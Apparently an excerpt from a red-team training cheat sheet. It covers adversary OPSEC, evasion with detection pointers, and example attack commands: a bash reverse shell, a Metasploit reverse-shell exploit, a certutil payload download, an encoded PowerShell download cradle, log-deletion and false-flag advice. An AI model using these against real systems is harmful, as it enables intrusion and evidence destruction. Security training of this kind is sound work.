4. Advanced / Operator Level — Tradecraft & Evasion

Adversary Operational Security (OPSEC) Considerations

  • C2 Discipline: Use domain fronting, CDN routing, or legitimate cloud services to mask C2 traffic.
  • Credential Management: Never reuse credentials across operations. Use unique passwords, VPN endpoints, and operational personas.
  • Timing Obfuscation: Schedule scanning and exploitation during legitimate business hours to blend with normal traffic.
  • Beaconing Discipline: Use jittered beacon intervals (e.g., 5-15 minutes with random variation) rather than fixed intervals.
  • Cleanup Procedures: Plan and execute cleanup before engagement ends — remove tools, delete logs, revert config changes.

Evasion Techniques

Technique Description Detection Opportunity
Living off the Land (LOLBins) Using built-in OS tools (PowerShell, WMI, certutil, bitsadmin) instead of downloading malware Command-line logging (Sysmon EID 1), PowerShell ScriptBlock logging
Log Tampering Clearing or selectively deleting log entries to remove evidence Event ID 1102 (Audit Log Cleared), gaps in log sequence numbers, SIEM forwarding to immutable storage
Process Injection Executing code within a legitimate process to evade detection Event ID 4663 (process access), EDR behavioral detection
DNS Tunneling Encapsulating data in DNS queries to bypass firewall restrictions Anomalous DNS query volume, long subdomains (>100 characters)
Timestamp Stomping Altering file timestamps to evade forensic timeline analysis File integrity monitoring (FIM), timeline anomalies via MACB analysis

Adversary Decision Cycle: The OODA Loop

Phase Description Adversary Action
Observe Gather intelligence on target OSINT, network mapping, technology fingerprinting
Orient Analyze intelligence against known vulnerabilities Map to CVEs, exploit databases, identify weak points
Decide Choose the cheapest, quietest path to objective Select tool, technique, and timing
Act Execute with precision Deploy exploit, establish persistence, exfiltrate data

Adversary Philosophy

  • Patience is Strategy: Advanced adversaries measure time in months or years.
  • Redundancy is Survival: Maintain multiple footholds, C2 channels, and persistence mechanisms.
  • Deniability is Protection: Use infrastructure that can be abandoned, impersonate other groups (false flags).
  • Human Intelligence is Force Multiplier: Social engineering and insider recruitment are often more effective than zero-days.
  • Automation is Scalability: Criminal syndicates automate ransomware deployment, credential stuffing, and reconnaissance.

6. Adversarial Examples — Commands and Tools

Reconnaissance & Enumeration Commands

# Passive reconnaissance
$ whois target.com
$ dnsenum --enum target.com -o dns_results.xml

# Active scanning with service fingerprinting
$ nmap -sV -sC -O -p- -oA recon_scan target.com

# Web path enumeration (rate-limited to avoid DoS)
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 20

# SSL/TLS cipher enumeration
$ nmap --script ssl-enum-ciphers -p 443 target.com

# SMB enumeration and share listing
$ enum4linux -a target.com
$ smbclient -L \\target.com -N

# LDAP enumeration for user and group discovery
$ ldapsearch -x -H ldap://target.com -b "dc=target,dc=com" "(objectclass=person)"

Exploitation & Initial Access (PoC Only)

# Validate CVE-2021-41773 (Apache path traversal)
$ curl -s -o /dev/null -w "%{http_code}" http://target.com/cgi-bin/.%2e/.%2e/.%2e/etc/passwd
# Expect 200 if vulnerable; 403 if patched

# SQL injection validation with safe defaults
$ sqlmap -u "http://target.com/page?id=1" --batch --level=2 --risk=1 --tables

# Controlled Metasploit PoC
$ msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS target.com; set PAYLOAD cmd/unix/reverse_perl; set LHOST 10.10.14.5; exploit -j"

# Quick reverse-shell validation (immediate termination)
$ nc -lvnp 4444 &
$ curl -X POST http://target.com/vuln --data 'cmd=bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# certutil file download (signed Windows binary)
$ certutil -urlcache -split -f http://192.168.1.100/payload.exe C:\Windows\Temp\update.exe

# PowerShell memory-only execution (no disk artifact)
$ powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=

# WMI lateral movement (no binary drop)
$ wmic /node:192.168.1.51 process call create "cmd.exe /c whoami > \\192.168.1.50\share\out.txt"

# netsh persistent port proxy / tunnel
$ netsh interface portproxy add v4tov4 listenport=4444 connectaddress=192.168.1.100 connectport=443

Privilege Escalation & Lateral Movement

# Linux privilege escalation enumeration
$ wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh -a > peass_output.txt

# Windows privilege escalation via PowerUp
$ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks | Out-File powerup.txt"

# Credential harvesting (authorized Red Team only)

7. Key Takeaways

Concept What You Should Remember Operator View
CIAAN Confidentiality, Integrity, Availability, Authenticity, Non-repudiation define what security must protect. Each element becomes an attacker objective.
TTPs Tactics explain why, techniques explain how, and procedures explain the step-by-step. Track behavior, not just tools.
Attack Classes Passive, active, close-in, insider, and distribution attacks describe different ways systems can be targeted. Classify the attack before choosing controls.
Phased Methodology Adversaries move through denial, change, steal, entry, expand, and stay objectives. Map every phase to detection and response.
Persistence & Evasion Successful attackers focus on maintaining access and avoiding detection after compromise. Monitor scheduled tasks, startup items, SSH keys, registry changes, process behavior, and encrypted tunnels.
AI as Force Multiplier AI can improve efficiency, automation, analysis, and reporting but cannot replace human judgment. Use AI for suggestions, not final authority. Always validate findings manually.
Authorization Is Essential Ethical hacking must always be conducted within approved scope and with explicit written permission. Ensures testing remains legal, controlled, and professionally managed.
Offensive and Defensive Security Are Connected Every attack technique can reveal opportunities for monitoring, detection, and response. Strengthens collaboration between offensive and defensive security teams.
🎯 Final Reminder: Use this cheat sheet to decode acronyms quickly, pick the right tool for each phase, and tie every action back to a tactic, technique, and clear business impact. Know the adversary, document every step, validate every finding, and never test without written authorization.
